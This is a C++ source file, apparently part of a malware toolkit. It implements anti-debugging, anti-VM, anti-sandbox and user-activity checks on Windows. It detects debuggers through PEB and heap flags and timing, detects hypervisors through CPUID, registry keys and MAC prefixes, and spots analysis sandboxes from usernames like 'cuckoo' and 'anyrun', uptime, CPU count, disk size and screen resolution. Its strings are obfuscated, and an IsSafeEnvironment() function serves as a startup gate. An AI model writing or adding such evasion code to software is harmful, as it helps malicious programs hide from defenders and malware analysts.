#include "AntiAnalysis.h"
#include <intrin.h>
#include <iphlpapi.h>
#pragma comment(lib, "iphlpapi.lib")

typedef NTSTATUS(NTAPI* pNtQueryInfoProcess)(HANDLE,PROCESSINFOCLASS,PVOID,ULONG,PULONG);

// ── Anti-Debug ────────────────────────────────────────────────────────────────

std::string AntiAnalysis::CheckDebugger() {
    std::string r = "=== Anti-Debug ===\n";
    int flags = 0;

    // 1. IsDebuggerPresent (PEB.BeingDebugged byte)
    bool ibp = IsDebuggerPresent() != 0;
    r += "  IsDebuggerPresent:        " + std::string(ibp?"YES [DEBUGGER]":"no") + "\n";
    if (ibp) flags++;

    // 2. CheckRemoteDebuggerPresent (NtQueryInformationProcess DebugPort)
    BOOL remote = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &remote);
    r += "  RemoteDebuggerPresent:    " + std::string(remote?"YES [DEBUGGER]":"no") + "\n";
    if (remote) flags++;

    // 3. NtQueryInformationProcess — ProcessDebugFlags (0x1F)
    //    Returns 0 if debugged, non-zero if clean
    auto NtQIP = (pNtQueryInfoProcess)GetProcAddress(
        GetModuleHandleA(S("ntdll.dll").c_str()), S("NtQueryInformationProcess").c_str());
    if (NtQIP) {
        DWORD debugFlags = 0;
        NtQIP(GetCurrentProcess(), (PROCESSINFOCLASS)0x1F, &debugFlags, sizeof(debugFlags), NULL);
        bool dbgFlag = (debugFlags == 0);
        r += "  NtQIP ProcessDebugFlags:  " + std::string(dbgFlag?"YES [DEBUGGER]":"no") + "\n";
        if (dbgFlag) flags++;
    }

    // 4. Heap flags (ForceFlags bit 2 set by debugger in HeapCreate)
    PPEB peb = NULL;
#ifdef _WIN64
    peb = (PPEB)__readgsqword(0x60);
#else
    peb = (PPEB)__readfsdword(0x30);
#endif
    if (peb && PEB_PROCESS_HEAP(peb)) {
        // Heap flags at +0x40 (x64) or +0x28 (x86)
        DWORD* heapFlags = (DWORD*)((BYTE*)PEB_PROCESS_HEAP(peb) +
#ifdef _WIN64
            0x70   // Win10 x64 HeapFlags offset
#else
            0x40
#endif
        );
        bool heapDbg = ((*heapFlags) & 0x40000060) != 0;
        r += "  Heap ForceFlags:          " + std::string(heapDbg?"YES [DEBUGGER]":"no") + "\n";
        if (heapDbg) flags++;
    }

    // 5. RDTSC timing attack — debugger introduces measurable delay
    DWORD64 t1 = __rdtsc();
    for (volatile int i = 0; i < 1000; i++);  // cheap NOP sled
    DWORD64 t2 = __rdtsc();
    DWORD64 delta = t2 - t1;
    bool timing = (delta > 500000); // threshold — debugger causes >>10x overhead
    r += "  RDTSC delta (" + std::to_string(delta) + " cycles): " +
         std::string(timing?"SUSPECT [possible debugger]":"normal") + "\n";
    if (timing) flags++;

    r += "  Result: " + std::string(flags>0?"DEBUGGER DETECTED":"clean") +
         " (" + std::to_string(flags) + "/5 signals)\n";
    return r;
}

// ── Anti-VM ───────────────────────────────────────────────────────────────────

std::string AntiAnalysis::CheckVM() {
    std::string r = "=== Anti-VM ===\n";
    int flags = 0;

    // 1. CPUID hypervisor bit: leaf 1, ECX bit 31
    int cpuInfo[4] = {};
    __cpuid(cpuInfo, 1);
    bool hvBit = (cpuInfo[2] >> 31) & 1;
    r += "  CPUID HV bit (ECX[31]):   " + std::string(hvBit?"YES [VM]":"no") + "\n";
    if (hvBit) flags++;

    // 2. Hypervisor vendor string via CPUID leaf 0x40000000
    __cpuid(cpuInfo, 0x40000000);
    char vendor[13] = {};
    memcpy(vendor+0, &cpuInfo[1], 4);
    memcpy(vendor+4, &cpuInfo[2], 4);
    memcpy(vendor+8, &cpuInfo[3], 4);
    vendor[12] = 0;
    bool hvVendor = (strstr(vendor,S("VMware").c_str()) || strstr(vendor,S("KVMKVMKVM").c_str()) ||
                     strstr(vendor,S("Microsoft Hv").c_str()) || strstr(vendor,S("VBoxVBox").c_str()));
    r += "  Hypervisor vendor:        '" + std::string(vendor) + "'" +
         std::string(hvVendor?" [VM]":"") + "\n";
    if (hvVendor) flags++;

    // 3. Registry: VMware Tools
    HKEY hk;
    bool vmReg = (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        S("SOFTWARE\\VMware Inc.\\VMware Tools").c_str(), 0, KEY_READ, &hk) == ERROR_SUCCESS);
    if (vmReg) RegCloseKey(hk);
    r += "  VMware registry key:      " + std::string(vmReg?"YES [VM]":"no") + "\n";
    if (vmReg) flags++;

    // 4. VirtualBox registry
    bool vbReg = (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        S("SOFTWARE\\Oracle\\VirtualBox Guest Additions").c_str(), 0, KEY_READ, &hk) == ERROR_SUCCESS);
    if (vbReg) RegCloseKey(hk);
    r += "  VirtualBox registry key:  " + std::string(vbReg?"YES [VM]":"no") + "\n";
    if (vbReg) flags++;

    // 5. MAC OUI prefix check
    PIP_ADAPTER_INFO info = NULL;
    ULONG sz = sizeof(IP_ADAPTER_INFO);
    info = (PIP_ADAPTER_INFO)malloc(sz);
    if (GetAdaptersInfo(info, &sz) == ERROR_BUFFER_OVERFLOW) {
        free(info); info = (PIP_ADAPTER_INFO)malloc(sz);
    }
    bool vmMac = false;
    if (info && GetAdaptersInfo(info, &sz) == NO_ERROR) {
        // VMware: 00:0C:29 / 00:50:56, VBox: 08:00:27, Hyper-V: 00:15:5D
        static const BYTE ouis[][3] = {
            {0x00,0x0C,0x29},{0x00,0x50,0x56},{0x08,0x00,0x27},{0x00,0x15,0x5D}
        };
        for (auto* a = info; a; a = a->Next) {
            for (auto& oui : ouis) {
                if (memcmp(a->Address, oui, 3) == 0) { vmMac = true; break; }
            }
            if (vmMac) break;
        }
    }
    free(info);
    r += "  VM MAC OUI:               " + std::string(vmMac?"YES [VM]":"no") + "\n";
    if (vmMac) flags++;

    r += "  Result: " + std::string(flags>0?"VM DETECTED":"clean") +
         " (" + std::to_string(flags) + "/5 signals)\n";
    return r;
}

// ── Anti-Sandbox ──────────────────────────────────────────────────────────────

std::string AntiAnalysis::CheckSandbox() {
    std::string r = "=== Anti-Sandbox ===\n";
    int flags = 0;

    // 1. Known sandbox usernames
    static const std::vector<std::string> sbUsers = {
        S("john"), S("sandbox"), S("malware"), S("test"), S("analysis"), S("virus"),
        S("admin"), S("user"), S("cuckoo"), S("anyrun"), S("hybrid"), S("joe"), S("triage"),
    };
    char user[256] = {}; DWORD ul = sizeof(user);
    GetUserNameA(user, &ul);
    _strlwr_s(user, sizeof(user));
    bool sbUser = false;
    for (const auto& u : sbUsers)
        if (strstr(user, u.c_str())) { sbUser = true; break; }
    r += "  Username '" + std::string(user) + "': " +
         std::string(sbUser?"SUSPECT [sandbox]":"ok") + "\n";
    if (sbUser) flags++;

    // 2. Uptime < 10 minutes (sandbox typically resets between samples)
    DWORD upMs = GetTickCount();
    bool lowUp = upMs < 600000;
    r += "  Uptime " + std::to_string(upMs/1000) + "s: " +
         std::string(lowUp?"LOW [sandbox]":"ok") + "\n";
    if (lowUp) flags++;

    // 3. CPU count (sandboxes often single-core)
    SYSTEM_INFO si; GetSystemInfo(&si);
    bool singleCpu = (si.dwNumberOfProcessors == 1);
    r += "  CPU cores=" + std::to_string(si.dwNumberOfProcessors) + ": " +
         std::string(singleCpu?"SINGLE [sandbox]":"ok") + "\n";
    if (singleCpu) flags++;

    // 4. Disk size < 60 GB
    ULARGE_INTEGER free64, total64, tfree64;
    bool smallDisk = false;
    if (GetDiskFreeSpaceExA("C:\\", &free64, &total64, &tfree64)) {
        DWORD64 gb = total64.QuadPart / (1024ULL*1024*1024);
        smallDisk = gb < 60;
        r += "  Disk C: " + std::to_string(gb) + " GB: " +
             std::string(smallDisk?"SMALL [sandbox]":"ok") + "\n";
        if (smallDisk) flags++;
    }

    // 5. Screen resolution
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    bool lowRes = (sw < 800 || sh < 600);
    r += "  Resolution " + std::to_string(sw) + "x" + std::to_string(sh) + ": " +
         std::string(lowRes?"LOW [sandbox]":"ok") + "\n";
    if (lowRes) flags++;

    r += "  Result: " + std::string(flags>0?"SANDBOX SUSPECTED":"clean") +
         " (" + std::to_string(flags) + "/5 signals)\n";
    return r;
}

// ── User Interaction ──────────────────────────────────────────────────────────

std::string AntiAnalysis::CheckUserActivity() {
    std::string r = "=== User Activity ===\n";
    int active = 0;

    // 1. Mouse movement over 3 seconds
    POINT p1, p2;
    GetCursorPos(&p1);
    Sleep(3000);
    GetCursorPos(&p2);
    bool moved = (p1.x != p2.x || p1.y != p2.y);
    r += "  Mouse moved (3s):         " + std::string(moved?"YES [user present]":"no [possibly sandbox]") + "\n";
    if (moved) active++;

    // 2. Foreground window changed
    HWND fw1 = GetForegroundWindow();
    Sleep(1000);
    HWND fw2 = GetForegroundWindow();
    bool fwChg = (fw1 != fw2);
    r += "  Foreground window change: " + std::string(fwChg?"YES [user active]":"no") + "\n";
    if (fwChg) active++;

    // 3. Clipboard has content
    bool clip = IsClipboardFormatAvailable(CF_TEXT) != 0;
    r += "  Clipboard has text:       " + std::string(clip?"YES [user present]":"no") + "\n";
    if (clip) active++;

    r += "  Result: " + std::string(active>0?"USER ACTIVITY DETECTED (real machine likely)":
                                             "NO USER ACTIVITY (sandbox likely)") +
         " (" + std::to_string(active) + "/3 signals)\n";
    return r;
}

// ── Combined ──────────────────────────────────────────────────────────────────

bool AntiAnalysis::IsSafeEnvironment() {
    // Quick checks only (no delays) — used as a fast gate at startup
    if (IsDebuggerPresent()) return false;
    int cpuInfo[4];
    __cpuid(cpuInfo, 1);
    if ((cpuInfo[2] >> 31) & 1) return false; // hypervisor
    if (GetSystemMetrics(SM_CXSCREEN) < 800) return false;
    { SYSTEM_INFO si; GetSystemInfo(&si); if (si.dwNumberOfProcessors == 1) return false; }
    return true;
}

std::string AntiAnalysis::FullReport() {
    return CheckDebugger() + "\n" +
           CheckVM()       + "\n" +
           CheckSandbox()  + "\n" +
           CheckUserActivity();
}
